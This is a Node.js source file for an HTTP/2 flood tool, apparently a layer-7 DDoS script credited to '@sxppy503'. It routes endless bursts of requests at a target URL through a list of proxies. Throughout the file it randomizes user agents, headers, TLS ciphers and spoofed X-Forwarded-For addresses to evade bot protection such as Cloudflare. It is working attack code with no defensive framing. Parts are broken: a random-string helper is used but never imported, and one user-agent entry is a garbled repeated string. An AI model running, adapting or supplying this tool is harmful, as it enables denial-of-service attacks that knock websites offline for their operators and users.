const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  cluster = require('cluster'),
  //  randstr = require('randomstring'),
  cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
  ],
  encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
  ],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
  ],
  ua_list = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (X11; Linux i686; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)", "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Edg/104.0.1293.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSafari/537.36 Edg/104.0.1293.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSafari/537.36 OPR/89.0.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSafari/537.36 OPR/89.0.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSafari/537.36 OPR/89.0.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV537.36 OPR/89.0.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSafari/537.36 Vivaldi/5.3.2679.70", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70", "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Vivaldi/5.3.2679.70", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36"],
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
  ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
  //console.warn(e);
}).setMaxListeners(0);

function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}

function spoof() {
  return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g),
  rps = process.argv[6];

function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
  const dateObj = new Date();

  console.log(`Target: ${target} | Threads: ${thread} | RPS: ${rps} | Time: ${time}s | by @sxppy503`);

  for (var bb = 0; bb < thread; bb++) {

    cluster.fork();

  }

  setTimeout(() => {

    process.exit(-1)

  }, time * 1000)

} else {

  var parsed = url.parse(target);

  function flood() {

    const agent = new http.Agent({
      keepAlive: true,
      keepAliveMsecs: 10000,
      maxSockets: 0,
    });

    const ua = ua_list[Math.floor(Math.random() * ua_list.length)];

    var cipper = cipher();
    var proxy = proxyr().split(':');

    var header = {
      ":path": parsed.path,
      "X-Forwarded-For": randomIp(),
      ":method": "GET",
      "User-agent": ua,
      "Origin": target,
      "Accept": accept(),
      "Accept-Encoding": encoding(),
      "Accept-Language": lang(),
      "Cache-Control": controling(),
    };

    var req = http.request({
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {

      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cipper,
          secureProtocol: 'TLS_method',
          TLS_MAX_VERSION: '1.2',
          servername: parsed.host,
          curve: "GREASE:X25519:x25519",
          secure: true,
          rejectUnauthorized: false,
          ALPNProtocols: ['h2'],
          socket: socket
        }, function() {
          for (let i = 0; i < rps; i++) {
            const req = client.request(header);
            req.setEncoding('utf8');

            req.on('data', (chunk) => {
              // data += chunk;
            });
            req.on("response", () => {
              req.close();
            })
            req.end();
          }
        })
      });
    });

    req.on('end', () => {
      req.resume()
      req.close();
    });

    req.end();

  }

  setInterval(() => {
    flood()
  })
}